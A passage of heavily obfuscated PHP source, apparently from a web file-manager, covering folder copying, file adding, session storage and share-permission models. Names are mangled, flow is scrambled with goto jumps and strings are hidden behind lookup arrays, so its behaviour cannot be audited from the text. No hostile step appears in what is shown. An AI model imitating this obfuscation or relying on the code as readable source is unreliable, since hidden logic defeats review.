$e¡ï∏»◊ﬂ⁄[493] => array(), $e¡ï∏»◊ﬂ⁄[530] => array()); $EÚÇàõîï∞ = $Dåæ»ñÔÕÆ ? $Dåæ»ñÔÕÆ : $c°é€ñ‘íΩ->getPathName($c°é€ñ‘íΩ->pathThis($Cƒ°Œå‰øì)); goto DìÓé›Öˆæ; B≠Ç⁄∫ŸÛ…: Hook::trigger($e¡ï∏»◊ﬂ⁄[532]); if ($eÌç™¬Æºâ) { $this->folderSizeResetChildren($eÌç™¬Æºâ); } $this->_childrenListClear(); goto Aö…ˆ»¯ÈÑ; bÑèòºÿÜ†: Model($e¡ï∏»◊ﬂ⁄[418])->linkAdd($aó¨Ÿﬂ∞õå[$e¡ï∏»◊ﬂ⁄[493]]); Model($e¡ï∏»◊ﬂ⁄[418])->remove($aó¨Ÿﬂ∞õå[$e¡ï∏»◊ﬂ⁄[530]]); $this->folderSizeReset($BËØπûõàÑ); goto A¬ÎóﬂÁ®ñ; C˘Øº˜⁄¢Õ: } private function _copyChildTo($fÔ™äÆóêè, $b»ó¶ûÖÂ⁄, $eøùÓ≠ò‚È, $bÒ¥¶…ﬂˆè, &$d¿§–¿ÜÜ©, $bÂ Ü≠àÁ∫) { goto CÏè‚ıÌäı; cé‚àÚÈ•›: $eüº‹–øóª = $this->_childrenList($eøùÓ≠ò‚È); $eüº‹–øóª = array_to_keyvalue($eüº‹–øóª, $Bã‘ﬁ©ßô∫[28]); foreach ($DÿÒÈ÷ªà as $c“Áüò‰‘û) { $f⁄≈«Ç‡∏‘ = $eüº‹–øóª[$c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[28]]]; $d˜ÑÍå‹¡á = $f⁄≈«Ç‡∏‘[$Bã‘ﬁ©ßô∫[366]]; $this->_copyApplyMeta($f⁄≈«Ç‡∏‘, $d¿§–¿ÜÜ©); if ($c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[29]] == $Bã‘ﬁ©ßô∫[77]) { $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[76]] = $fÔ™äÆóêè->getPathInner($c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[76]]); $this->_copyChildTo($fÔ™äÆóêè, $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[76]], $d˜ÑÍå‹¡á, $bÒ¥¶…ﬂˆè, $d¿§–¿ÜÜ©, $bÂ Ü≠àÁ∫); } } goto E¨‰ê∏éñä; CÏè‚ıÌäı: $Bã‘ﬁ©ßô∫ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÀò‰›ÒÚê = $this->sourceInfoCache($eøùÓ≠ò‚È); $a„¶·ÜãŒ¨ = $fÔ™äÆóêè->listPath($b»ó¶ûÖÂ⁄, !1, !0); goto dÑùß©ôÎú; dÑùß©ôÎú: $DÿÒÈ÷ªà = array_merge($a„¶·ÜãŒ¨[$Bã‘ﬁ©ßô∫[74]], $a„¶·ÜãŒ¨[$Bã‘ﬁ©ßô∫[75]]); $a¿í◊≥ãôê = $this->_addFiles($fÔ™äÆóêè, $a„¶·ÜãŒ¨[$Bã‘ﬁ©ßô∫[74]], $bÂ Ü≠àÁ∫); $b—œù¡¨®É = array(); goto Dº∑∑ÍÎøΩ; Dº∑∑ÍÎøΩ: foreach ($DÿÒÈ÷ªà as &$c“Áüò‰‘û) { goto cí¿Æﬂ¯π£; BÖ≤º§ˆ‚: if ($bÒ¥¶…ﬂˆè) { $b”°ÕªÓ†„ = $this->fileNameExistCache($eøùÓ≠ò‚È, $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[28]]); if ($b”°ÕªÓ†„) { if ($c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[367]] || $bÒ¥¶…ﬂˆè == REPEAT_SKIP) { continue; } if ($bÒ¥¶…ﬂˆè == REPEAT_REPLACE) { $f⁄≈«Ç‡∏‘ = $this->sourceInfoCache($b”°ÕªÓ†„); $e´ô‘”Œ”  = $this->fileHistory($f⁄≈«Ç‡∏‘, $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[415]], $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[78]]); if ($e´ô‘”Œ” ) { $d¿§–¿ÜÜ©[$Bã‘ﬁ©ßô∫[493]][] = $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[415]]; } continue; } else { if ($bÒ¥¶…ﬂˆè == REPEAT_RENAME) { $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[28]] = $this->fileNameAutoCache($eøùÓ≠ò‚È, $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[28]], $bÒ¥¶…ﬂˆè, !1); } } } } if (!$c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[367]] && $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[415]]) { $d¿§–¿ÜÜ©[$Bã‘ﬁ©ßô∫[493]][] = $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[415]]; } $b—œù¡¨®É[] = $this->_makeItemData($c“Áüò‰‘û, $FÀò‰›ÒÚê, $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[28]]); goto aÀÜ¶Ìª’é; cí¿Æﬂ¯π£: if (isset($a¿í◊≥ãôê[$c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[28]]])) { $c“Áüò‰‘û = $a¿í◊≥ãôê[$c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[28]]]; } $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[367]] = $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[29]] == $Bã‘ﬁ©ßô∫[77]; $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[369]] = _get($c“Áüò‰‘û, $Bã‘ﬁ©ßô∫[157], $Bã‘ﬁ©ßô∫[33]); goto Cô≈Œ·®ıË; Cô≈Œ·®ıË: $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[78]] = _get($c“Áüò‰‘û, $Bã‘ﬁ©ßô∫[78], 0); $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[415]] = _get($c“Áüò‰‘û, $Bã‘ﬁ©ßô∫[415], 0); if (!isset($c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[533]]) && $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[415]]) { $d¿§–¿ÜÜ©[$Bã‘ﬁ©ßô∫[530]][] = $c“Áüò‰‘û[$Bã‘ﬁ©ßô∫[415]]; } goto BÖ≤º§ˆ‚; aÀÜ¶Ìª’é: } unset($c“Áüò‰‘û); if (!empty($b—œù¡¨®É)) { $this->addAll($b—œù¡¨®É); } goto cé‚àÚÈ•›; E¨‰ê∏éñä: } private function _addFiles($e´•±íäﬁ≤, $dê¯Ûÿ∞ë€, $a∂·ÒŸÑƒ ) { goto bàÿ≤ §ø©; Bâ‹‹™§ã›: foreach ($céﬁ«îÜ≥Ô as $d§Óã©±ˆ) { if (!isset($déÛ––ıª™[$d§Óã©±ˆ[$B∞Ö©û≤ à[160]]])) { continue; } $dØ≥Æ‚≈Ì◊ =& $déÛ––ıª™[$d§Óã©±ˆ[$B∞Ö©û≤ à[160]]]; foreach ($dØ≥Æ‚≈Ì◊ as &$e”ê¯≈¥¯») { $e”ê¯≈¥¯»[$B∞Ö©û≤ à[415]] = $d§Óã©±ˆ[$B∞Ö©û≤ à[415]]; } unset($e”ê¯≈¥¯»); } $F‘Í»îâüã = array(); foreach ($dê¯Ûÿ∞ë€ as $aÒﬁµ¢ª‚ã) { $F‘Í»îâüã[$aÒﬁµ¢ª‚ã[$B∞Ö©û≤ à[28]]] = $aÒﬁµ¢ª‚ã; } goto cÈåÈ¥Ü·à; a£”’ªéΩª: foreach ($dê¯Ûÿ∞ë€ as &$e”ê¯≈¥¯») { goto c¢˘Êœ‘äÇ; b™∞∞•∞õÏ: $e”ê¯≈¥¯»[$B∞Ö©û≤ à[160]] = $dùãº‹∫ õ; Hook::trigger($B∞Ö©û≤ à[535], $e”ê¯≈¥¯»); $déÛ––ıª™[$dùãº‹∫ õ][] =& $e”ê¯≈¥¯»; goto cµ–ﬁœÏπ…; cµ–ﬁœÏπ…: if (count($déÛ––ıª™[$dùãº‹∫ õ]) > 1) { $e”ê¯≈¥¯»[$B∞Ö©û≤ à[533]] = !0; } goto dôìÛú‡ñ‚; d‹ß‰·Ùâÿ: $dùãº‹∫ õ = $e´•±íäﬁ≤->hashMd5($e”ê¯≈¥¯»[$B∞Ö©û≤ à[76]]); if (strlen($dùãº‹∫ õ) > 10 && !isset($déÛ––ıª™[$dùãº‹∫ õ])) { $déÛ––ıª™[$dùãº‹∫ õ] = array(); } $e”ê¯≈¥¯»[$B∞Ö©û≤ à[161]] = $e·ç”≥©áÒ; goto b™∞∞•∞õÏ; c¢˘Êœ‘äÇ: Hook::trigger($B∞Ö©û≤ à[534], $e”ê¯≈¥¯»); $e”ê¯≈¥¯»[$B∞Ö©û≤ à[76]] = $e´•±íäﬁ≤->getPathInner($e”ê¯≈¥¯»[$B∞Ö©û≤ à[76]]); $e·ç”≥©áÒ = $e´•±íäﬁ≤->hashSimple($e”ê¯≈¥¯»[$B∞Ö©û≤ à[76]]); goto d‹ß‰·Ùâÿ; dôìÛú‡ñ‚: } $C«èÀçõ‰ï = array($B∞Ö©û≤ à[160] => array($B∞Ö©û≤ à[7], array_keys($déÛ––ıª™))); $aΩ°æ¢∏å¶ = Model($B∞Ö©û≤ à[536]); goto b°≥¨ÇèÊ¬; bàÿ≤ §ø©: $B∞Ö©û≤ à =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$dê¯Ûÿ∞ë€ || count($dê¯Ûÿ∞ë€) == 0) { return array(); } $déÛ––ıª™ = array(); goto a£”’ªéΩª; cêåÀ¨õêˆ: $C«èÀçõ‰ï = array($B∞Ö©û≤ à[160] => array($B∞Ö©û≤ à[7], array_keys($déÛ––ıª™))); $céﬁ«îÜ≥Ô = $aΩ°æ¢∏å¶->where($C«èÀçõ‰ï)->select(); $céﬁ«îÜ≥Ô = $céﬁ«îÜ≥Ô ? $céﬁ«îÜ≥Ô : array(); goto Bâ‹‹™§ã›; cÈåÈ¥Ü·à: return $F‘Í»îâüã; goto c”«Ëêà“µ; e≤ºª»Óıä: $a‹°¥§õ‹œ = array(); foreach ($dê¯Ûÿ∞ë€ as $AéÎ©ãÖˆ‰) { if (isset($AéÎ©ãÖˆ‰[$B∞Ö©û≤ à[533]]) && $AéÎ©ãÖˆ‰[$B∞Ö©û≤ à[533]]) { continue; } $f¥≈á≈ ‚ = $e´•±íäﬁ≤->getPathInner($AéÎ©ãÖˆ‰[$B∞Ö©û≤ à[76]]); $AëëÔ¿á“¯ = $aΩ°æ¢∏å¶->addFileMake($f¥≈á≈ ‚, $AéÎ©ãÖˆ‰[$B∞Ö©û≤ à[78]], $AéÎ©ãÖˆ‰[$B∞Ö©û≤ à[161]], $AéÎ©ãÖˆ‰[$B∞Ö©û≤ à[160]], $AéÎ©ãÖˆ‰[$B∞Ö©û≤ à[28]], $a∂·ÒŸÑƒ ); $a‹°¥§õ‹œ[] = $AëëÔ¿á“¯; } $aΩ°æ¢∏å¶->addAll($a‹°¥§õ‹œ); goto cêåÀ¨õêˆ; b°≥¨ÇèÊ¬: $céﬁ«îÜ≥Ô = $aΩ°æ¢∏å¶->where($C«èÀçõ‰ï)->select(); $céﬁ«îÜ≥Ô = $céﬁ«îÜ≥Ô ? $céﬁ«îÜ≥Ô : array(); foreach ($céﬁ«îÜ≥Ô as $d§Óã©±ˆ) { if (!isset($déÛ––ıª™[$d§Óã©±ˆ[$B∞Ö©û≤ à[160]]])) { continue; } $aÕîˆæÜãï = $déÛ––ıª™[$d§Óã©±ˆ[$B∞Ö©û≤ à[160]]]; foreach ($aÕîˆæÜãï as &$e”ê¯≈¥¯») { $e”ê¯≈¥¯»[$B∞Ö©û≤ à[415]] = $d§Óã©±ˆ[$B∞Ö©û≤ à[415]]; $e”ê¯≈¥¯»[$B∞Ö©û≤ à[533]] = !0; } unset($e”ê¯≈¥¯»); } goto e≤ºª»Óıä; c”«Ëêà“µ: } } define($_SERVER[£¿ÌÙëü¡¯¯][537], $_SERVER[£¿ÌÙëü¡¯¯][538]); goto cù∞Ô…ì∑´; f√Ï§é„Ëô: register_shutdown_function($_SERVER[‚ﬁ][35]); set_error_handler($_SERVER[‚ﬁ][48], $b‹´∂íÀ¿ë); if (function_exists($_SERVER[‚ﬁ][49])) { set_exception_handler($_SERVER[‚ﬁ][50]); } goto CŸÉ∆ïêèé; B◊ß»Èá–Ç: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\137\x73\145\163\163\x69\x6f\156"; public function get($F⁄ÂÇÍ’ﬂØ) { $dâùÒÖúßá =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÇÇ±Çö§Ç = $this->where(array($dâùÒÖúßá[2116] => $F⁄ÂÇÍ’ﬂØ))->find(); if (!is_array($bÇÇ±Çö§Ç)) { return !1; } return $bÇÇ±Çö§Ç[$dâùÒÖúßá[679]]; } public function set($eõà Œûˆë, $cÂßÁä§’«, $b€ΩÚ∏Ë™ö = 3600) { $FìΩ√Û∆å⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; $D∏ƒöÔƒÛ = array($FìΩ√Û∆å⁄[2116] => $eõà Œûˆë, $FìΩ√Û∆å⁄[2044] => $cÂßÁä§’«, $FìΩ√Û∆å⁄[2117] => $b€ΩÚ∏Ë™ö + time()); if (Session::get($FìΩ√Û∆å⁄[2118])) { $D∏ƒöÔƒÛ[$FìΩ√Û∆å⁄[1349]] = Session::get($FìΩ√Û∆å⁄[2118]); } else { $D∏ƒöÔƒÛ[$FìΩ√Û∆å⁄[1349]] = 0; } if ($this->get($eõà Œûˆë)) { return $this->where(array($FìΩ√Û∆å⁄[2116] => $eõà Œûˆë))->save($D∏ƒöÔƒÛ); } else { return $this->add($D∏ƒöÔƒÛ, array(), !0); } } public function remove($eòµ¶»ÂÙ‡) { return $this->where(array($_SERVER[£¿ÌÙëü¡¯¯][2116] => $eòµ¶»ÂÙ‡))->delete(); } public function clearTimeout() { return $this->where($_SERVER[£¿ÌÙëü¡¯¯][2119] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\151\155\x65", "\x74\x69\x6d\145", "\x69\156\163\145\x72\164\x2c\165\x70\x64\x61\164\x65", "\x66\165\x6e\143\164\x69\157\156"), array("\x63\162\145\x61\164\145\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\151\156\163\x65\162\164", "\x66\x75\156\x63\x74\x69\157\156"), array("\157\x70\x74\x69\157\156\x73", '', "\x69\156\163\x65\x72\x74\54\165\x70\144\141\164\x65\54\x73\145\154\x65\143\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Dùº°ª‹—î) { $bÒ’Ò±ƒ∂≈ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fÜ‘∏’”·å = isset($Dùº°ª‹—î[0]) ? $Dùº°ª‹—î[0] : !1; return array($bÒ’Ò±ƒ∂≈[2120] => array(USER_ID, $bÒ’Ò±ƒ∂≈[2121]), $bÒ’Ò±ƒ∂≈[2082] => array($fÜ‘∏’”·å, $bÒ’Ò±ƒ∂≈[2122])); } protected function listSimple() { $cÌÁÇê∂É‚ = array($_SERVER[£¿ÌÙëü¡¯¯][1349] => USER_ID); $B†ÙÍπÏ¶ç = $this->field($this->fieldList)->where($cÌÁÇê∂É‚)->select(); return $B†ÙÍπÏ¶ç ? $B†ÙÍπÏ¶ç : array(); } protected function getInfo($f¬∂ª”œê√, $B¨ÇóÙ’àê = false) { $Aç≠≠Íñîœ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($B¨ÇóÙ’àê) { return $this->_getShareInfo(array($Aç≠≠Íñîœ[437] => $f¬∂ª”œê√)); } $EÁüõ¥≠ÈÉ = $this->cacheFunctionGet($Aç≠≠Íñîœ[2123], $f¬∂ª”œê√); return $EÁüõ¥≠ÈÉ; } public function getInfoByHash($C“ºã˜»ÇÓ) { return $this->_getShareInfo(array($_SERVER[£¿ÌÙëü¡¯¯][439] => $C“ºã˜»ÇÓ)); } public function getInfoByPath($c´≤é¶éí≈) { $Cû∏ôËΩÀÂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $BµÚå÷£í≤ = array($Cû∏ôËΩÀÂ[1349] => USER_ID, $Cû∏ôËΩÀÂ[366] => $c´≤é¶éí≈); return $this->_getShareInfo($BµÚå÷£í≤); } public function getInfoBySourcePath($F¿π´µ∞ÎÎ) { $CòÂ¢ä©¶ë =& $_SERVER[£¿ÌÙëü¡¯¯]; $féﬁ’‡Æàë = array($CòÂ¢ä©¶ë[1349] => USER_ID, $CòÂ¢ä©¶ë[992] => $F¿π´µ∞ÎÎ); return $this->_getShareInfo($féﬁ’‡Æàë); } private function _getShareInfo($c°…Ω¯Òì) { goto DºÑû ˘Ò”; Dá¥à‘¬È≠: if ($AÉÁ·ıÏÇ§[$FåÈ£’ˆÌß[366]] == $FåÈ£’ˆÌß[464]) { $AÉÁ·ıÏÇ§[$FåÈ£’ˆÌß[388]] = IO::info($AÉÁ·ıÏÇ§[$FåÈ£’ˆÌß[992]]); } else { $AÉÁ·ıÏÇ§[$FåÈ£’ˆÌß[388]] = Model($FåÈ£’ˆÌß[1084])->pathInfo($AÉÁ·ıÏÇ§[$FåÈ£’ˆÌß[366]]); } $AÉÁ·ıÏÇ§[$FåÈ£’ˆÌß[2125]] = $aûﬁíÓ¨Â•; return $AÉÁ·ıÏÇ§; goto DÎØπéŒú˘; DºÑû ˘Ò”: $FåÈ£’ˆÌß =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÉÁ·ıÏÇ§ = $this->where($c°…Ω¯Òì)->find(); if (!$AÉÁ·ıÏÇ§) { return !1; } goto eÚˆÜæÙÔÓ; eÚˆÜæÙÔÓ: $c°…Ω¯Òì = array($FåÈ£’ˆÌß[437] => $AÉÁ·ıÏÇ§[$FåÈ£’ˆÌß[437]]); $d”˜ß‡åäü = $FåÈ£’ˆÌß[2124]; $aûﬁíÓ¨Â• = Model($FåÈ£’ˆÌß[529])->order($FåÈ£’ˆÌß[364])->field($d”˜ß‡åäü)->where($c°…Ω¯Òì)->select(); goto Dá¥à‘¬È≠; DÎØπéŒú˘: } protected function getInfoAuth($f“”Ì§À’¿) { $cÀé“áøœû =& $_SERVER[£¿ÌÙëü¡¯¯]; $A£ÑÊØ⁄éâ = $this->getInfo($f“”Ì§À’¿); $A£ÑÊØ⁄éâ[$cÀé“áøœû[373]] = Model($cÀé“áøœû[450])->authMake($A£ÑÊØ⁄éâ[$cÀé“áøœû[2125]]); return $A£ÑÊØ⁄éâ; } protected function listData($cêÆ¥¬ÂÊ’ = null, $F‚∂Í»ÆÜµ = 300) { $E¥Ç’õ¬å¯ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fı¯‘üÆ≥ = array(array($E¥Ç’õ¬å¯[442] => array($E¥Ç’õ¬å¯[924], 0), $E¥Ç’õ¬å¯[444] => array($E¥Ç’õ¬å¯[924], 0), $E¥Ç’õ¬å¯[2126] => $E¥Ç’õ¬å¯[2095])); if ($cêÆ¥¬ÂÊ’ == $E¥Ç’õ¬å¯[1779]) { $Fı¯‘üÆ≥ = array($E¥Ç’õ¬å¯[442] => 1); } else { if ($cêÆ¥¬ÂÊ’ == $E¥Ç’õ¬å¯[981]) { $Fı¯‘üÆ≥ = array($E¥Ç’õ¬å¯[444] => 1); } } $Fı¯‘üÆ≥[$E¥Ç’õ¬å¯[1349]] = USER_ID; $C°≠í≥®‘… = $this->where($Fı¯‘üÆ≥)->selectPage($F‚∂Í»ÆÜµ); return $C°≠í≥®‘…; } protected function listToMe($Béâ√ªŒØÛ = 300) { goto c®√ö“ˆ§∂; déò˜ﬂè“—: $AÃ…Úé‰Ñπ = array($eßë∑¶ß‘´[437] => array($eßë∑¶ß‘´[381], array_keys($Bõ˜≥ª∑å—))); $DºÉÖÏÏ¨¡ = $this->field($B¬•ÁøìÂ©)->where($AÃ…Úé‰Ñπ)->select(); foreach ($DºÉÖÏÏ¨¡ as $C´Ùú›ÖØé => &$D€ê®Îôëö) { $D€ê®Îôëö[$eßë∑¶ß‘´[2125]] = $Bõ˜≥ª∑å—[$D€ê®Îôëö[$eßë∑¶ß‘´[437]]]; } goto bÇÇˆ€‚Ïç; DÙ∆Ì’œ∂®: $AÃ…Úé‰Ñπ = array($eßë∑¶ß‘´[513] => SourceModel::TYPE_USER, $eßë∑¶ß‘´[452] => USER_ID); if ($EàßÒ¢Â â) { $AÃ…Úé‰Ñπ = array(array($eßë∑¶ß‘´[513] => SourceModel::TYPE_USER, $eßë∑¶ß‘´[452] => USER_ID), array($eßë∑¶ß‘´[513] => SourceModel::TYPE_GROUP, $eßë∑¶ß‘´[452] => array($eßë∑¶ß‘´[7], $EàßÒ¢Â â)), $eßë∑¶ß‘´[2126] => $eßë∑¶ß‘´[2095]); } $c¢ùâ°∆Ò’ = Model($eßë∑¶ß‘´[529])->where($AÃ…Úé‰Ñπ)->selectPage($Béâ√ªŒØÛ); goto c§ö€±Æ∏‚; bÇÇˆ€‚Ïç: $b≥Òµ≥π∆£ = array($eßë∑¶ß‘´[2129] => $DºÉÖÏÏ¨¡, $eßë∑¶ß‘´[2130] => $c¢ùâ°∆Ò’[$eßë∑¶ß‘´[347]]); return $b≥Òµ≥π∆£; goto CÁèàﬂ«§™; c§ö€±Æ∏‚: $Bõ˜≥ª∑å— = array_to_keyvalue_group($c¢ùâ°∆Ò’[$eßë∑¶ß‘´[350]], $eßë∑¶ß‘´[437]); if (!$Bõ˜≥ª∑å—) { return $c¢ùâ°∆Ò’; } $B¬•ÁøìÂ© = $eßë∑¶ß‘´[2128]; goto déò˜ﬂè“—; c®√ö“ˆ§∂: $eßë∑¶ß‘´ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÇŒ÷Ÿ◊åÊ = Session::get($eßë∑¶ß‘´[2127]); $EàßÒ¢Â â = array_to_keyvalue($DÇŒ÷Ÿ◊åÊ, $eßë∑¶ß‘´[33], $eßë∑¶ß‘´[2013]); goto DÙ∆Ì’œ∂®; CÁèàﬂ«§™: } protected function shareAdd($a…Ãôƒæßá, $a„Á—àŸ¿ã) { $Dè’ê‘ã÷‚ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÔ‰ÌÂ≤àä = $this->_addShareData($a…Ãôƒæßá, $a„Á—àŸ¿ã); if (!empty($a„Á—àŸ¿ã[$Dè’ê‘ã÷‚[2131]])) { $this->_shareAuthSet($AÔ‰ÌÂ≤àä, $a„Á—àŸ¿ã[$Dè’ê‘ã÷‚[2131]]); } $this->shareEventAdd($a…Ãôƒæßá, $a„Á—àŸ¿ã, $Dè’ê‘ã÷‚[984]); return $AÔ‰ÌÂ≤àä; } private function shareEventAdd($BæÖîéÃÊœ, $dâìÌ«•ë”, $DíüÇùÿ∑Ω = "\141\x64\x64") { goto e¥á™ ê®Ì; c”™ﬂèŒó¥: if ($BéÏ¶ã⁄ÿå[$dï∏†¡ñ»õ[444]] == $dï∏†¡ñ»õ[464] && $dâìÌ«•ë”[$dï∏†¡ñ»õ[444]] == $dï∏†¡ñ»õ[84]) { $a†¢ÇïñÇ– = $dï∏†¡ñ»õ[2133]; } if ($BéÏ¶ã⁄ÿå[$dï∏†¡ñ»õ[444]] == $dï∏†¡ñ»õ[84] && $dâìÌ«•ë”[$dï∏†¡ñ»õ[444]] == $dï∏†¡ñ»õ[464]) { $a†¢ÇïñÇ– = $dï∏†¡ñ»õ[2136]; } Model($dï∏†¡ñ»õ[497])->eventShare($BæÖîéÃÊœ, $a†¢ÇïñÇ–); goto fÜñ‘·ê–ê; e¥á™ ê®Ì: $dï∏†¡ñ»õ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($DíüÇùÿ∑Ω == $dï∏†¡ñ»õ[984]) { if ($dâìÌ«•ë”[$dï∏†¡ñ»õ[442]] == $dï∏†¡ñ»õ[84]) { Model($dï∏†¡ñ»õ[497])->eventShare($BæÖîéÃÊœ, $dï∏†¡ñ»õ[2132]); } if ($dâìÌ«•ë”[$dï∏†¡ñ»õ[444]] == $dï∏†¡ñ»õ[84]) { Model($dï∏†¡ñ»õ[497])->eventShare($BæÖîéÃÊœ, $dï∏†¡ñ»õ[2133]); } return; } $BéÏ¶ã⁄ÿå = $this->getInfoByPath($BæÖîéÃÊœ); goto f–£õ‹‘Ï†; fÜñ‘·ê–ê: return; goto Fãèè·Á‘¢; f–£õ‹‘Ï†: $a†¢ÇïñÇ– = $dï∏†¡ñ»õ[2134]; if ($BéÏ¶ã⁄ÿå[$dï∏†¡ñ»õ[442]] == $dï∏†¡ñ»õ[464] && $dâìÌ«•ë”[$dï∏†¡ñ»õ[442]] == $dï∏†¡ñ»õ[84]) { $a†¢ÇïñÇ– = $dï∏†¡ñ»õ[2132]; } if ($BéÏ¶ã⁄ÿå[$dï∏†¡ñ»õ[442]] == $dï∏†¡ñ»õ[84] && $dâìÌ«•ë”[$dï∏†¡ñ»õ[442]] == $dï∏†¡ñ»õ[464]) { $a†¢ÇïñÇ– = $dï∏†¡ñ»õ[2135]; } goto c”™ﬂèŒó¥; Fãèè·Á‘¢: } private function _addShareData($CÈ∫ΩÛõ‰Ó, $Bç°¡ê‹Öû = array()) { goto aö√ÙåÛ¥Ÿ; D‹íì∑∞π: return $Fáöéì†Úå; goto E¶æ¯ª∑©ú; eê‡ˆ˘ê»Ç: $Fáöéì†Úå = $this->add($f‰óâ√ú√√); $cûÛÇ´Ö‚Ï = array($Eäô∫êÆ†›[439] => short_id($Fáöéì†Úå)); $this->where(array($Eäô∫êÆ†›[436] => $Fáöéì†Úå))->save($cûÛÇ´Ö‚Ï); goto D‹íì∑∞π; aö√ÙåÛ¥Ÿ: $Eäô∫êÆ†› =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aô⁄Çê“≤± = array($Eäô∫êÆ†›[380] => $CÈ∫ΩÛõ‰Ó, $Eäô∫êÆ†›[1340] => USER_ID); if ($CÈ∫ΩÛõ‰Ó == 0) { $Aô⁄Çê“≤± = array($Eäô∫êÆ†›[2137] => $Bç°¡ê‹Öû[$Eäô∫êÆ†›[992]], $Eäô∫êÆ†›[1340] => USER_ID); } goto b…”†˘æçí; b…”†˘æçí: if ($Eô°‡¢Îà’ = $this->where($Aô⁄Çê“≤±)->find()) { return $Eô°‡¢Îà’[$Eäô∫êÆ†›[437]]; } if ($CÈ∫ΩÛõ‰Ó == 0) { $b±ŸíÂÌ≠à = array($Eäô∫êÆ†›[28] => get_path_this($Bç°¡ê‹Öû[$Eäô∫êÆ†›[76]])); } else { $b±ŸíÂÌ≠à = Model($Eäô∫êÆ†›[749])->sourceInfo($CÈ∫ΩÛõ‰Ó); if (!$b±ŸíÂÌ≠à) { return !1; } } if (!$Bç°¡ê‹Öû[$Eäô∫êÆ†›[1248]]) { $Bç°¡ê‹Öû[$Eäô∫êÆ†›[1248]] = $b±ŸíÂÌ≠à[$Eäô∫êÆ†›[28]]; } goto aã∂ù¯¢ƒ¡; aã∂ù¯¢ƒ¡: $f‰óâ√ú√√ = array($Eäô∫êÆ†›[1340] => USER_ID, $Eäô∫êÆ†›[380] => $CÈ∫ΩÛõ‰Ó, $Eäô∫êÆ†›[1248] => $Eäô∫êÆ†›[33], $Eäô∫êÆ†›[442] => 0, $Eäô∫êÆ†›[444] => 0, $Eäô∫êÆ†›[992] => $Eäô∫êÆ†›[33], $Eäô∫êÆ†›[292] => $Eäô∫êÆ†›[33], $Eäô∫êÆ†›[799] => $Eäô∫êÆ†›[33], $Eäô∫êÆ†›[2138] => 0, $Eäô∫êÆ†›[2139] => 0, $Eäô∫êÆ†›[690] => 0, $Eäô∫êÆ†›[2140] => $Eäô∫êÆ†›[33], $Eäô∫êÆ†›[439] => $Eäô∫êÆ†›[33]); $aôﬂ’ﬁÒõ∏ = explode($Eäô∫êÆ†›[47], $Eäô∫êÆ†›[2141]); foreach ($aôﬂ’ﬁÒõ∏ as $E∂àûÜ«î) { if (!isset($Bç°¡ê‹Öû[$E∂àûÜ«î])) { continue; } $f‰óâ√ú√√[$E∂àûÜ«î] = $Bç°¡ê‹Öû[$E∂àûÜ«î]; } goto eê‡ˆ˘ê»Ç; E¶æ¯ª∑©ú: } private function _shareAuthSet($BáÇí®ò’°, $f†‘€Ö™«Ê) { goto eäËÁ¯ƒ‡—; EËÚ≤ÙßÂ·: $CﬂºÜÏÈ™Ñ->where(array($D«ÙùîŸôì[437] => $BáÇí®ò’°))->delete(); $cÂÖêΩï¥ = array(); foreach ($f†‘€Ö™«Ê as $E–àæ®ÕÂØ) { $dÖó€¶‡ïü = SourceModel::TYPE_USER; if ($E–àæ®ÕÂØ[$D«ÙùîŸôì[368]] == SourceModel::TYPE_GROUP) { $dÖó€¶‡ïü = SourceModel::TYPE_GROUP; } $fù∂ƒ§·ÛÒ = array($D«ÙùîŸôì[437] => $BáÇí®ò’°, $D«ÙùîŸôì[368] => $dÖó€¶‡ïü, $D«ÙùîŸôì[452] => intval($E–àæ®ÕÂØ[$D«ÙùîŸôì[452]]), $D«ÙùîŸôì[2143] => 0, $D«ÙùîŸôì[2144] => -1); if ($E–àæ®ÕÂØ[$D«ÙùîŸôì[2143]]) { $fù∂ƒ§·ÛÒ[$D«ÙùîŸôì[2143]] = $E–àæ®ÕÂØ[$D«ÙùîŸôì[2143]]; } else { if ($E–àæ®ÕÂØ[$D«ÙùîŸôì[2144]]) { $fù∂ƒ§·ÛÒ[$D«ÙùîŸôì[2144]] = $E–àæ®ÕÂØ[$D«ÙùîŸôì[2144]]; } } $cÂÖêΩï¥[] = 